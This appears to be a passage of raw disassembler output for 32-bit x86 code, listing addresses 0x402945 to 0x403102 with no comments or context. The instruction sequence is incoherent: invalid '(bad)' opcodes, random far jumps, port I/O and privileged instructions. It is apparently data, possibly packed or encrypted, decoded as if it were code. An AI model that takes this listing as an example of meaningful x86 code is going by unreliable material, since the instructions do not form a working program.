  402945:	add    edi,DWORD PTR [edi+0x20]
  402948:	(bad)  
  40294a:	mov    al,0xda
  40294c:	mov    ah,0xfe
  40294e:	ja     0x4028d6
  402950:	xchg   edx,eax
  402951:	jb     0x40294c
  402953:	fisubr DWORD PTR [ebx+0x16]
  402956:	push   ss
  402957:	aad    0x41
  402959:	stc    
  40295a:	in     eax,0x9c
  40295c:	fdivp  st(4),st
  40295e:	sbb    ah,cl
  402960:	or     DWORD PTR [ecx],ebx
  402962:	inc    edx
  402963:	sahf   
  402964:	jecxz  0x40295d
  402966:	jae    0x402966
  402968:	rol    DWORD PTR [esi+ecx*2-0x61],cl
  40296c:	lds    ebx,FWORD PTR [ecx-0x2b]
  40296f:	or     esp,DWORD PTR ds:0xe57f3bb1
  402975:	sub    esi,DWORD PTR [esi+esi*1+0x61]
  402979:	jge    0x402992
  40297b:	inc    esi
  40297c:	mov    ch,BYTE PTR [ebp+edx*2+0x47]
  402980:	inc    edi
  402981:	push   edx
  402982:	pop    esi
  402983:	sbb    al,0x23
  402985:	ins    DWORD PTR es:[edi],dx
  402986:	not    DWORD PTR [esi]
  402988:	xchg   BYTE PTR [edx],ch
  40298a:	sub    dh,dh
  40298c:	inc    edi
  40298d:	retf   0xe2f4
  402990:	mov    ebp,0x84a9ae06
  402995:	fmul   DWORD PTR ds:0x4099c042
  40299b:	add    BYTE PTR [ebx-0x4a35df4c],0xa8
  4029a2:	jp     0x4029b8
  4029a4:	sbb    ecx,DWORD PTR [ebp-0x24]
  4029a7:	jno    0x4029ea
  4029a9:	cli    
  4029aa:	je     0x40292e
  4029ac:	fcmovne st,st(1)
  4029ae:	jne    0x4029e2
  4029b0:	jp     0x402a03
  4029b2:	sub    DWORD PTR [eax],ebx
  4029b4:	mov    edx,?
  4029b6:	ret    0xadf
  4029b9:	rcl    DWORD PTR ds:0x1240bf75,0x51
  4029c0:	inc    eax
  4029c1:	push   ds
  4029c2:	and    dh,BYTE PTR [ecx+esi*1]
  4029c5:	push   ds
  4029c6:	dec    edx
  4029c7:	pop    es
  4029c8:	pop    ss
  4029c9:	inc    edi
  4029ca:	pop    esi
  4029cb:	stos   BYTE PTR es:[edi],al
  4029cc:	test   al,0xef
  4029ce:	bound  esi,QWORD PTR [eax+0x62]
  4029d1:	out    0x37,eax
  4029d3:	sbb    al,0xf5
  4029d5:	gs cld 
  4029d7:	pop    ecx
  4029d8:	aad    0x24
  4029da:	xor    edi,DWORD PTR [ebp+0x73db0c5]
  4029e0:	mov    bh,0x1f
  4029e2:	inc    ebx
  4029e3:	pushf  
  4029e4:	stos   DWORD PTR es:[edi],eax
  4029e5:	jmp    0xb89ebe38
  4029ea:	inc    edi
  4029eb:	pop    esp
  4029ec:	in     al,dx
  4029ed:	xchg   esi,eax
  4029ee:	push   esp
  4029ef:	pushf  
  4029f0:	cwde   
  4029f1:	and    edx,DWORD PTR [edi-0x6d3f2b4d]
  4029f7:	aam    0xd9
  4029f9:	add    al,bl
  4029fb:	inc    edx
  4029fc:	fiadd  DWORD PTR [ecx-0x6b]
  4029ff:	add    DWORD PTR [ebp+ecx*8+0x7e15d594],edx
  402a06:	or     eax,0x6e5eaccd
  402a0b:	mov    eax,0x1b6987c1
  402a10:	jno    0x4029e6
  402a12:	adc    BYTE PTR [edi],bh
  402a14:	fsubr  st(7),st
  402a16:	idiv   DWORD PTR [edi-0x34]
  402a19:	cmc    
  402a1a:	gs jbe 0x402a01
  402a1d:	shl    DWORD PTR [edi-0x34],0x4e
  402a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a22:	xor    esi,DWORD PTR [esi+0x38b15812]
  402a28:	pop    ebp
  402a29:	inc    esi
  402a2a:	test   ebx,0xf642b2b8
  402a30:	jne    0x4029cd
  402a32:	ret    
  402a33:	les    ecx,FWORD PTR [edi+0x75f13030]
  402a39:	jmp    0x4029ff
  402a3b:	(bad)
  402a3e:	sbb    cl,BYTE PTR [eax]
  402a40:	pop    ss
  402a41:	movhps xmm0,QWORD PTR [eax+0x4477dfcb]
  402a48:	jno    0x4029e8
  402a4a:	sub    BYTE PTR [esi],0x3d
  402a4d:	faddp  st(0),st
  402a4f:	mov    ch,0x40
  402a51:	and    DWORD PTR ds:0xfaef8afc,edx
  402a57:	ins    BYTE PTR es:[edi],dx
  402a58:	mov    eax,0x32894602
  402a5d:	je     0x402acd
  402a5f:	stc    
  402a60:	add    BYTE PTR [esi],ah
  402a62:	fidiv  DWORD PTR ds:0x2598cb25
  402a68:	xor    esi,ecx
  402a6a:	mov    BYTE PTR [ecx+0x6be9582],al
  402a70:	mov    al,ds:0x37872cb5
  402a75:	lods   al,BYTE PTR ds:[esi]
  402a76:	push   es
  402a77:	fidivr DWORD PTR [eax-0x49]
  402a7a:	xchg   esi,eax
  402a7b:	fcmovb st,st(7)
  402a7d:	or     BYTE PTR [esi+0x7d],ch
  402a80:	sbb    ecx,DWORD PTR [edi-0xf]
  402a83:	fistp  WORD PTR [ebx]
  402a85:	test   DWORD PTR [eax],esi
  402a87:	fwait
  402a88:	ss jge 0x402a7a
  402a8b:	stc    
  402a8c:	jo     0x402a14
  402a8e:	inc    edx
  402a8f:	shr    dl,1
  402a91:	iret   
  402a92:	iret   
  402a93:	pop    ebp
  402a94:	cmp    dl,cl
  402a96:	or     BYTE PTR [edx-0x41],0xb4
  402a9a:	dec    esi
  402a9b:	enter  0xc2b9,0x29
  402a9f:	mov    DWORD PTR [edx],ebx
  402aa1:	inc    esi
  402aa2:	push   ebp
  402aa3:	push   eax
  402aa4:	adc    DWORD PTR [ecx-0x81749b2],eax
  402aaa:	sbb    BYTE PTR [ebx+edx*8+0x273269d5],bl
  402ab1:	add    al,0x10
  402ab3:	and    al,0x67
  402ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ab6:	test   BYTE PTR es:[edx-0x125d213a],ch
  402abd:	ja     0x402ac7
  402abf:	repz or ebp,edi
  402ac2:	or     BYTE PTR [eax+0x26],ch
  402ac5:	rcl    BYTE PTR [edi],1
  402ac7:	stos   DWORD PTR es:[edi],eax
  402ac8:	dec    esp
  402ac9:	sbb    ecx,DWORD PTR [ecx]
  402acb:	int    0x17
  402acd:	stos   BYTE PTR es:[edi],al
  402ace:	xor    al,ch
  402ad0:	into   
  402ad1:	popa   
  402ad2:	hlt    
  402ad3:	xor    BYTE PTR [ebx+0x36],al
  402ad6:	mov    WORD PTR [ebp-0x6d],ss
  402ad9:	mov    eax,ds:0xea7e30c7
  402ade:	out    0x8f,eax
  402ae0:	pop    es
  402ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ae2:	imul   esp,DWORD PTR [ebx+0x5f],0x5e63481b
  402ae9:	dec    esp
  402aea:	out    dx,eax
  402aeb:	lea    eax,[edi+0x6976cf1d]
  402af1:	and    esp,DWORD PTR [ecx]
  402af3:	stos   BYTE PTR es:[edi],al
  402af4:	push   ebp
  402af5:	add    bh,BYTE PTR [edx]
  402af7:	mov    ch,0x93
  402af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402afa:	arpl   WORD PTR [edi],cx
  402afc:	add    eax,DWORD PTR [edx]
  402afe:	jo     0x402b25
  402b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b01:	scas   eax,DWORD PTR es:[edi]
  402b02:	call   0x2ad2e185
  402b07:	push   edx
  402b08:	jno    0x402b7a
  402b0a:	fisttp WORD PTR [edi+0x32c60b3a]
  402b10:	scas   al,BYTE PTR es:[edi]
  402b11:	jmp    0x402abb
  402b13:	adc    DWORD PTR [ebp-0xa26d727],eax
  402b19:	xor    eax,0x127a936c
  402b1e:	call   0xf6fd:0x1578662b
  402b25:	adc    BYTE PTR [edi],dl
  402b27:	fdivp  st(3),st
  402b29:	sahf   
  402b2a:	fwait
  402b2b:	pop    edi
  402b2c:	pop    ebp
  402b2d:	stc    
  402b2e:	jns    0x402acf
  402b30:	mov    al,ds:0x8272a5cf
  402b35:	sbb    eax,0xf2279376
  402b3a:	xchg   esi,eax
  402b3b:	mov    ch,0x32
  402b3d:	sub    DWORD PTR [esi],edx
  402b3f:	sbb    esp,ecx
  402b41:	xor    BYTE PTR [esi-0x70],cl
  402b44:	(bad)  
  402b45:	cmp    eax,0x83ab529d
  402b4a:	dec    ebp
  402b4b:	pop    ds
  402b4c:	ret    0xa7d9
  402b4f:	inc    ebp
  402b50:	out    dx,eax
  402b51:	sbb    BYTE PTR [edx+0x1144cb60],al
  402b57:	pop    eax
  402b58:	push   0x90a0ada1
  402b5d:	ds sahf 
  402b5f:	in     eax,0x9e
  402b61:	(bad)  
  402b62:	test   edx,0x35b6cd94
  402b68:	js     0x402b34
  402b6a:	(bad)  
  402b6b:	mov    esp,0x521d535f
  402b70:	cmp    al,bl
  402b72:	cmp    BYTE PTR [edi-0x790bfef0],cl
  402b78:	daa    
  402b79:	cli    
  402b7a:	mov    esp,esp
  402b7c:	fs dec edi
  402b7e:	retf   0x84f7
  402b81:	dec    ecx
  402b82:	sbb    cl,BYTE PTR [ebx+0x8]
  402b85:	fdivr  st,st(4)
  402b87:	add    esp,DWORD PTR [esi-0x41]
  402b8a:	dec    esp
  402b8b:	inc    esi
  402b8c:	clc    
  402b8d:	push   edx
  402b8e:	lahf   
  402b8f:	mov    eax,0x64ba351b
  402b94:	jmp    0x402bcb
  402b96:	(bad)
  402b9a:	pop    edi
  402b9b:	mov    ebp,0x24447f62
  402ba0:	idiv   ecx
  402ba2:	dec    edx
  402ba4:	ins    BYTE PTR es:[edi],dx
  402ba5:	jg     0x402bd4
  402ba7:	jae    0x402b7e
  402ba9:	adc    al,0xac
  402bab:	sbb    DWORD PTR ds:0xea0ce178,esp
  402bb1:	sbb    BYTE PTR ss:[esi],dl
  402bb4:	sub    eax,0xb51a8d2b
  402bb9:	mov    eax,0xd1b40199
  402bbe:	cmp    edi,ecx
  402bc0:	mov    ds:0x4796387b,eax
  402bc5:	push   0x9d9e6ff9
  402bca:	arpl   WORD PTR [ecx+ecx*1+0x618a24cf],sp
  402bd1:	lods   al,BYTE PTR ds:[esi]
  402bd2:	(bad)  
  402bd3:	pop    edx
  402bd4:	xchg   ebx,eax
  402bd5:	(bad)  
  402bd6:	jmp    0x29cf:0xc4ad157e
  402bdd:	sub    dl,BYTE PTR [edi]
  402bdf:	daa    
  402be0:	push   eax
  402be1:	aaa    
  402be2:	mov    edx,0x897ee5b2
  402be7:	sbb    al,0xb1
  402be9:	push   eax
  402bea:	jns    0x402b87
  402bec:	ds stos DWORD PTR es:[edi],eax
  402bee:	scas   al,BYTE PTR es:[edi]
  402bef:	ret    0x6bef
  402bf2:	repz or eax,0x11356251
  402bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bf9:	ror    DWORD PTR [ecx+0x56],1
  402bfc:	jae    0x402bff
  402bfe:	or     ecx,esi
  402c00:	ja     0x402c1d
  402c02:	ds stos BYTE PTR es:[edi],al
  402c04:	lods   eax,DWORD PTR ds:[esi]
  402c05:	push   ebx
  402c06:	in     eax,dx
  402c07:	jnp    0x402ba1
  402c09:	imul   esi,DWORD PTR [edi],0xe91d0cf2
  402c0f:	jb     0x402bdc
  402c11:	adc    edx,DWORD PTR [ebx]
  402c13:	mov    esp,DWORD PTR [esi+esi*8]
  402c16:	adc    eax,ebp
  402c18:	daa    
  402c19:	repnz addr16 push ebp
  402c1c:	push   esi
  402c1d:	and    al,0x12
  402c1f:	adc    al,0xa3
  402c21:	loop   0x402bd4
  402c23:	and    esi,DWORD PTR [edx+0x31bba2f]
  402c29:	lahf   
  402c2a:	cmp    ecx,ebp
  402c2c:	xor    BYTE PTR [eax],bl
  402c2e:	cld    
  402c2f:	leave  
  402c30:	mov    BYTE PTR [ebp+0x31d2e62f],dl
  402c36:	daa    
  402c37:	or     eax,0x8225034e
  402c3c:	or     dh,BYTE PTR [edx+ebp*1]
  402c3f:	jecxz  0x402bde
  402c41:	lods   eax,DWORD PTR ds:[esi]
  402c42:	fstp   TBYTE PTR [esi+edi*1]
  402c45:	cmc    
  402c46:	test   esp,ebx
  402c48:	cwde   
  402c49:	mov    esp,0x16a2882
  402c4e:	sub    BYTE PTR [ecx],cl
  402c50:	jmp    0xe16f:0xdea9ee7b
  402c57:	adc    edi,ebp
  402c59:	mov    ds:0xc0d8c90e,eax
  402c5e:	xor    edi,esp
  402c60:	mov    eax,0xd7dc0569
  402c65:	dec    ecx
  402c66:	rcl    DWORD PTR [edx-0x57a2ad65],1
  402c6c:	mov    dh,BYTE PTR [eax+edi*8-0x5c]
  402c70:	dec    ecx
  402c71:	mov    DWORD PTR [eax],ebx
  402c73:	push   si
  402c75:	dec    ebx
  402c76:	iret   
  402c77:	mov    dl,0x19
  402c79:	outs   dx,BYTE PTR ds:[esi]
  402c7a:	loopne 0x402cf9
  402c7c:	fmul   QWORD PTR [ecx-0x32772896]
  402c82:	js     0x402c39
  402c84:	sub    DWORD PTR [esp+esi*1],esp
  402c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c88:	imul   edi,DWORD PTR [ecx],0xbccad50d
  402c8e:	mov    eax,0xf2213d68
  402c93:	add    eax,0x3f372c7e
  402c98:	repz jmp FWORD PTR [ecx+0x7b]
  402c9c:	pop    ds
  402c9d:	jmp    0x402c54
  402c9f:	in     eax,dx
  402ca0:	int3   
  402ca1:	pop    edi
  402ca2:	add    dh,BYTE PTR [ebx+edx*8-0x2]
  402ca6:	retf   0xeac0
  402ca9:	dec    edx
  402caa:	inc    ecx
  402cab:	mov    ds:0xcc5aa6e7,eax
  402cb0:	pop    esp
  402cb1:	repnz xor dl,BYTE PTR [esp+ecx*8]
  402cb5:	in     al,0x9a
  402cb7:	jmp    0x402c66
  402cb9:	cdq    
  402cba:	aam    0x87
  402cbc:	push   edi
  402cbd:	adc    ebp,DWORD PTR [esp+edx*4+0x71]
  402cc1:	retf   0x50c3
  402cc4:	sub    BYTE PTR [ebx+0x7f],al
  402cc7:	push   ecx
  402cc8:	cmp    DWORD PTR [edi+edx*1-0x57a72ef6],ebx
  402ccf:	jl     0x9febce38
  402cd5:	jmp    0xf3024732
  402cda:	aas    
  402cdb:	jp     0x402cce
  402cdd:	lods   eax,DWORD PTR ds:[esi]
  402cde:	ja     0x402d2f
  402ce0:	jge    0x402c95
  402ce2:	sbb    DWORD PTR [ebx-0x68],ebp
  402ce5:	ret    0xd16e
  402ce8:	sbb    al,0xf0
  402cea:	sub    DWORD PTR [ebx-0x202dffc8],ecx
  402cf0:	mov    eax,0xd642530c
  402cf5:	and    eax,DWORD PTR [ecx+0x1c]
  402cf8:	mov    ecx,0xb26db443
  402cfd:	xor    eax,DWORD PTR [ecx-0x8c4ef3c]
  402d03:	inc    eax
  402d04:	jg     0x402cea
  402d06:	fs jne 0x402ccb
  402d09:	fmul   st(2),st
  402d0b:	pop    esp
  402d0c:	jge    0x402d44
  402d0e:	nop
  402d0f:	jno    0x402d6a
  402d11:	mov    BYTE PTR [edx],ah
  402d13:	or     al,0xcd
  402d15:	jmp    0x5f6:0xdd42bc24
  402d1c:	mov    ebp,edx
  402d1e:	ret    0x57df
  402d21:	mov    dl,0xd8
  402d23:	dec    ecx
  402d24:	(bad)  
  402d25:	xlat   BYTE PTR ds:[ebx]
  402d26:	mov    ah,BYTE PTR [esp+ebp*1+0x6fa5a0e9]
  402d2d:	dec    esi
  402d2e:	jmp    0xcdd1:0xbceb9f12
  402d35:	repz mov bh,0x9e
  402d38:	cdq    
  402d39:	add    DWORD PTR ds:0xddae4d08,esp
  402d3f:	cmp    DWORD PTR [edx-0x5a],edx
  402d42:	jnp    0x402cee
  402d44:	call   0xacbb:0x208305ce
  402d4b:	jg     0x402d25
  402d4d:	sar    DWORD PTR [edx+esi*8],cl
  402d50:	outs   dx,DWORD PTR ds:[esi]
  402d51:	push   0xb2de7f46
  402d56:	gs jo  0x402dc0
  402d59:	popa   
  402d5a:	cmp    BYTE PTR [edi-0x38],dh
  402d5d:	lds    eax,FWORD PTR [esi-0x43]
  402d60:	and    al,0xd9
  402d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d63:	add    dl,BYTE PTR [edi+0x64da9c29]
  402d69:	mov    edi,0x7f208729
  402d6e:	pop    esp
  402d6f:	jbe    0x402d39
  402d71:	sub    BYTE PTR [ecx+0x374d9cc7],0x16
  402d78:	fs enter 0x750f,0x31
  402d7d:	outs   dx,BYTE PTR ds:[esi]
  402d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d7f:	add    ah,bh
  402d81:	jbe    0x402d04
  402d83:	mov    DWORD PTR [ecx],0x7c9f0d56
  402d89:	mov    edx,0xc9da78d
  402d8e:	jo     0x402dd2
  402d90:	test   eax,0xb1553553
  402d95:	sub    ecx,DWORD PTR [ecx+0x65]
  402d98:	enter  0xba23,0xad
  402d9c:	push   cs
  402d9d:	loopne 0x402de9
  402d9f:	mov    ch,0x67
  402da1:	xchg   ecx,eax
  402da2:	js     0x402d93
  402da4:	adc    al,BYTE PTR [esi-0x6459a4e6]
  402daa:	retf   0x1ea1
  402dad:	cwde   
  402dae:	jle    0x402d7c
  402db0:	cli    
  402db1:	shl    DWORD PTR [ebp-0x4d39ec09],cl
  402db7:	or     BYTE PTR [esi],ah
  402db9:	mov    bh,0xbe
  402dbb:	push   0xffffff85
  402dbd:	adc    eax,esi
  402dbf:	xor    al,0xda
  402dc1:	inc    ebp
  402dc2:	clc    
  402dc3:	nop
  402dc4:	cmp    eax,0xba97b1f2
  402dc9:	out    dx,eax
  402dca:	cmp    eax,0x5351a959
  402dcf:	into   
  402dd0:	(bad)  
  402dd2:	into   
  402dd3:	jo     0x402d67
  402dd5:	mov    eax,ds:0x4da0f978
  402dda:	or     BYTE PTR [ebp+0x1a54d845],cl
  402de0:	jge    0x402e24
  402de2:	cwde   
  402de3:	mov    edi,0xa2b97ab6
  402de8:	or     al,0xfb
  402dea:	shl    BYTE PTR [ebp+esi*1+0x40716192],1
  402df1:	lock stc 
  402df3:	sbb    dh,BYTE PTR [esi+ebx*4+0x2d993bc5]
  402dfa:	imul   ecx,DWORD PTR [eax-0x2],0x99aa7ec8
  402e01:	or     edi,DWORD PTR [edi-0x4bbb8f2e]
  402e07:	lea    ecx,[edx]
  402e09:	jmp    0x49827030
  402e0e:	push   0xf0db9b9e
  402e13:	dec    esi
  402e14:	(bad)
  402e17:	scas   eax,DWORD PTR es:[edi]
  402e18:	adc    al,0x74
  402e1a:	mov    ecx,0x420b314a
  402e1f:	jno    0x402e5c
  402e21:	cmp    BYTE PTR [esi],ch
  402e23:	jecxz  0x402de9
  402e25:	mov    esp,0xedd570bb
  402e2a:	dec    ebp
  402e2b:	xor    dl,ch
  402e2d:	dec    esp
  402e2e:	test   eax,0xf2eae4ac
  402e33:	call   0xcdc8:0x19b59694
  402e3a:	shl    bh,0x67
  402e3d:	cmp    BYTE PTR [ebp-0x7],dh
  402e40:	das    
  402e41:	test   eax,0xfbbed6b8
  402e46:	push   eax
  402e47:	pop    esp
  402e48:	(bad)  
  402e49:	dec    ebp
  402e4a:	aaa    
  402e4b:	push   ds
  402e4c:	inc    edx
  402e4d:	les    eax,FWORD PTR [ecx]
  402e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e50:	dec    ebx
  402e51:	jmp    0x7a58:0x89334a79
  402e58:	test   eax,0x4bd98b4d
  402e5d:	(bad)  
  402e5e:	adc    eax,0xd0e01334
  402e63:	mov    gs,esi
  402e65:	test   BYTE PTR [eax+ebx*1],bl
  402e68:	push   ebx
  402e69:	push   ebp
  402e6a:	or     al,0xd1
  402e6c:	out    dx,al
  402e6d:	pop    eax
  402e6e:	(bad)  
  402e6f:	and    eax,0xe2546cff
  402e74:	mov    ds:0x193e1ebf,eax
  402e79:	xor    ebp,DWORD PTR [edx+esi*8+0xe]
  402e7d:	cmp    BYTE PTR ds:0xeeaf139d,al
  402e83:	xor    edi,DWORD PTR [ecx+esi*2+0xd0e19d3]
  402e8a:	fstp   QWORD PTR [esi-0x70]
  402e8d:	out    0x6d,al
  402e8f:	jg     0x402e17
  402e91:	pushf  
  402e92:	jl     0x402eb0
  402e94:	ins    DWORD PTR es:[edi],dx
  402e95:	adc    eax,DWORD PTR ds:0x72354ef8
  402e9b:	add    al,0x75
  402e9d:	popf   
  402e9e:	cmp    eax,0xabf159fc
  402ea3:	aas    
  402ea4:	and    eax,0x529eb02
  402ea9:	push   ds
  402eaa:	fidivr WORD PTR [eax+0x5a]
  402ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eae:	cmp    BYTE PTR [ecx+0x66],0xd6
  402eb2:	sar    DWORD PTR [esi-0x59],cl
  402eb5:	inc    edi
  402eb6:	xlat   BYTE PTR ds:[ebx]
  402eb7:	retf   0x78fc
  402eba:	(bad)  
  402ebb:	int3   
  402ebc:	test   DWORD PTR [edi+0x24],esp
  402ebf:	stc    
  402ec0:	and    al,0xb3
  402ec2:	bound  eax,QWORD PTR [ebx-0x1507c3e4]
  402ec8:	shl    edi,0x38
  402ecb:	xlat   BYTE PTR ds:[ebx]
  402ecc:	dec    edi
  402ecd:	pop    ebp
  402ece:	out    dx,al
  402ecf:	hlt    
  402ed0:	shl    BYTE PTR [edx],cl
  402ed2:	lods   eax,DWORD PTR ds:[esi]
  402ed3:	bound  edi,QWORD PTR [edx+ecx*8-0x7b]
  402ed7:	imul   eax,DWORD PTR [eax],0x55fd080
  402edd:	push   ss
  402ede:	ds jle 0x402e73
  402ee1:	leave  
  402ee2:	je     0x402f09
  402ee4:	fs pop edx
  402ee6:	sbb    eax,0x2298f718
  402eeb:	sub    DWORD PTR [edx-0x5],ebx
  402eee:	das    
  402eef:	ror    BYTE PTR [eax-0x2b92b132],1
  402ef5:	xchg   ebx,eax
  402ef6:	pop    edi
  402ef7:	and    esp,DWORD PTR [ebx]
  402ef9:	cmp    al,0x84
  402efb:	lds    ebp,FWORD PTR [edx]
  402efd:	sub    eax,0xec6a07fd
  402f02:	mov    dh,0x14
  402f04:	mov    bh,0xdc
  402f06:	push   esi
  402f07:	sub    ebx,edx
  402f09:	push   0x35
  402f0b:	fst    QWORD PTR [edi+0x5f]
  402f0e:	call   0x2dc7:0x2293e6db
  402f15:	aad    0xb3
  402f17:	stos   DWORD PTR es:[edi],eax
  402f18:	es sahf 
  402f1a:	jnp    0x402f68
  402f1c:	mov    ah,0x57
  402f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f1f:	sub    al,0xf5
  402f21:	repz mov dl,BYTE PTR [esi+0x6e36c428]
  402f28:	xchg   ebp,eax
  402f29:	shl    DWORD PTR ds:0x7316b003,1
  402f2f:	xchg   edi,eax
  402f30:	dec    edx
  402f31:	mov    BYTE PTR [edi],bl
  402f33:	jmp    0x402efe
  402f35:	(bad)  
  402f36:	jae    0x402ebb
  402f38:	gs push ds
  402f3a:	cmp    BYTE PTR [ecx],0x5f
  402f3d:	xor    ebp,DWORD PTR [esp+edx*4-0x5a134d38]
  402f44:	mov    dh,0x36
  402f46:	fist   DWORD PTR [edi-0x5c5d23e0]
  402f4c:	mov    edi,0x790acc8e
  402f51:	jle    0x402f2b
  402f53:	sub    ebp,DWORD PTR [ebp*2-0x621a1cf9]
  402f5a:	mov    ebx,0x57182670
  402f5f:	aad    0xe2
  402f61:	push   eax
  402f62:	pop    ebx
  402f63:	xchg   DWORD PTR [ebp+0x52],ebx
  402f66:	imul   eax,DWORD PTR [edi*4+0x96a2587],0xffffffcb
  402f6e:	in     al,0xcf
  402f70:	jg     0x402f7d
  402f72:	jge    0x402fde
  402f74:	mov    ch,0x23
  402f76:	jl     0x402f9d
  402f78:	jae    0x402f08
  402f7a:	aas    
  402f7b:	push   edi
  402f7c:	out    dx,al
  402f7d:	popf   
  402f7e:	into   
  402f7f:	inc    ecx
  402f80:	pop    edi
  402f81:	out    0x63,eax
  402f83:	cmp    al,0x3a
  402f85:	or     ecx,eax
  402f87:	outs   dx,BYTE PTR ds:[esi]
  402f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f89:	sahf   
  402f8a:	pop    ecx
  402f8b:	dec    edx
  402f8c:	inc    ebx
  402f8d:	mov    BYTE PTR [eax],ch
  402f8f:	sub    DWORD PTR [edi],esi
  402f91:	std    
  402f92:	in     al,dx
  402f93:	pop    edi
  402f94:	or     eax,0x327d7c55
  402f99:	nop
  402f9a:	sar    BYTE PTR [ebp+0x7c258f16],cl
  402fa0:	add    al,al
  402fa2:	int    0x48
  402fa4:	stos   DWORD PTR es:[edi],eax
  402fa5:	jno    0x402f45
  402fa7:	pop    esi
  402fa8:	pop    eax
  402fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402faa:	setg   cl
  402fad:	pop    ss
  402fae:	inc    ecx
  402faf:	and    ebx,DWORD PTR [ecx]
  402fb1:	mov    edx,DWORD PTR [ecx+0x76772f0e]
  402fb7:	sbb    edx,esp
  402fb9:	and    edx,DWORD PTR [ebx-0x9976c46]
  402fbf:	fist   WORD PTR [edx+0x49]
  402fc2:	cli    
  402fc3:	or     BYTE PTR [esi-0x6f],dh
  402fc6:	cmp    DWORD PTR [esi],esp
  402fc8:	dec    esp
  402fc9:	icebp  
  402fca:	xchg   esi,eax
  402fcb:	js     0x403024
  402fcd:	test   BYTE PTR [esi+0x730d7b50],cl
  402fd3:	cmc    
  402fd4:	mov    edx,0x9efd9085
  402fd9:	iret   
  402fda:	jns    0x402fcc
  402fdc:	pop    eax
  402fdd:	inc    ebp
  402fde:	fwait
  402fdf:	aaa    
  402fe0:	aam    0xf9
  402fe2:	fld    TBYTE PTR [edi+0xf25f94c]
  402fe8:	(bad)  [eax+0x5e123296]
  402fee:	je     0x403057
  402ff0:	jae    0x403062
  402ff2:	aaa    
  402ff3:	in     eax,0x9c
  402ff5:	icebp  
  402ff6:	shr    BYTE PTR [eax-0x24],0x7d
  402ffa:	fnsave [eax]
  402ffc:	dec    edx
  402ffd:	adc    DWORD PTR [ecx+0xb3a6d7c],0x7bbc0eb3
  403007:	ins    DWORD PTR es:[edi],dx
  403008:	daa    
  403009:	in     al,dx
  40300a:	ret    0x2297
  40300d:	gs retf 
  40300f:	aas    
  403010:	call   0x11ce:0xfa91823
  403017:	test   bl,ah
  403019:	je     0x40302b
  40301b:	cmp    al,0x4e
  40301d:	arpl   WORD PTR [edx],si
  40301f:	hlt    
  403020:	pop    ss
  403021:	dec    edi
  403022:	fisub  WORD PTR [eax-0x29]
  403025:	mov    ebx,ecx
  403027:	adc    edi,DWORD PTR [ecx]
  403029:	dec    eax
  40302a:	bnd jg 0x403066
  40302d:	xchg   ebx,eax
  40302e:	mov    esp,0xbfd83e90
  403033:	push   ecx
  403034:	mov    dl,0x45
  403036:	call   0xd0f8e848
  40303b:	retf   0x4f56
  40303e:	xchg   DWORD PTR [ebx],ebp
  403040:	popa   
  403041:	inc    esi
  403042:	daa    
  403043:	mov    dl,0x48
  403045:	add    BYTE PTR [edi],cl
  403047:	in     al,dx
  403048:	xor    BYTE PTR [ebx],0xd6
  40304b:	sub    al,0xbc
  40304d:	pop    ds
  40304e:	aad    0x6f
  403050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403051:	shl    BYTE PTR ds:0x21e54f7a,1
  403057:	(bad)  
  403059:	imul   ebp,DWORD PTR ds:[eax],0xb184480c
  403060:	sub    al,0xf3
  403062:	adc    BYTE PTR [ebx-0x56],bh
  403065:	daa    
  403066:	or     DWORD PTR [edi+0x44],esp
  403069:	jp     0x4030ce
  40306b:	or     al,0x76
  40306d:	das    
  40306e:	rcr    cl,0x6d
  403071:	mov    dl,0xac
  403073:	ret    
  403074:	sbb    eax,0x56303402
  403079:	nop
  40307a:	add    DWORD PTR [esp+esi*1-0x21],edi
  40307e:	ficomp DWORD PTR [esi+0x75]
  403081:	push   ss
  403082:	sub    al,0x34
  403084:	aam    0xff
  403086:	lea    eax,[ebx+eiz*1-0x4bb818c4]
  40308d:	mov    ebx,ebp
  40308f:	xor    al,0xac
  403091:	mov    WORD PTR [edi],cs
  403093:	sbb    al,0x52
  403095:	push   eax
  403096:	mov    esp,0xb9ad621a
  40309b:	outs   dx,DWORD PTR ds:[esi]
  40309c:	(bad)  
  40309f:	xlat   BYTE PTR ds:[ebx]
  4030a0:	call   0xe138:0xe8757b13
  4030a7:	mov    dl,0x55
  4030a9:	(bad)  
  4030ab:	popa   
  4030ac:	(bad)
  4030af:	(bad)
  4030b2:	cmp    edi,DWORD PTR [edx+0x6419f65d]
  4030b8:	push   ss
  4030b9:	shl    ch,0x7
  4030bc:	and    BYTE PTR [eax-0x16],dl
  4030bf:	cmp    bh,BYTE PTR [eax+0x5cafb584]
  4030c5:	xchg   ah,ch
  4030c7:	add    ah,BYTE PTR [edi-0x30]
  4030ca:	fucomip st,st(6)
  4030cc:	mov    dl,0xb0
  4030ce:	cmp    esi,ecx
  4030d0:	repz add BYTE PTR [eax-0x39b0e740],dl
  4030d7:	es inc ebp
  4030d9:	push   eax
  4030da:	push   es
  4030db:	mov    ah,0x30
  4030dd:	cmp    eax,0x3414812a
  4030e2:	retf   
  4030e3:	push   edx
  4030e4:	out    dx,al
  4030e5:	leave  
  4030e6:	ret    
  4030e7:	popa   
  4030e8:	jbe    0x4030a4
  4030ea:	les    ebx,FWORD PTR [esi-0x2dc782ab]
  4030f0:	sar    BYTE PTR [ecx-0x388749e9],cl
  4030f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f7:	pop    ds
  4030f8:	das    
  4030f9:	shr    BYTE PTR [edx+0x31b87225],cl
  4030ff:	ret    0xb218
  403102:	pop    ebx
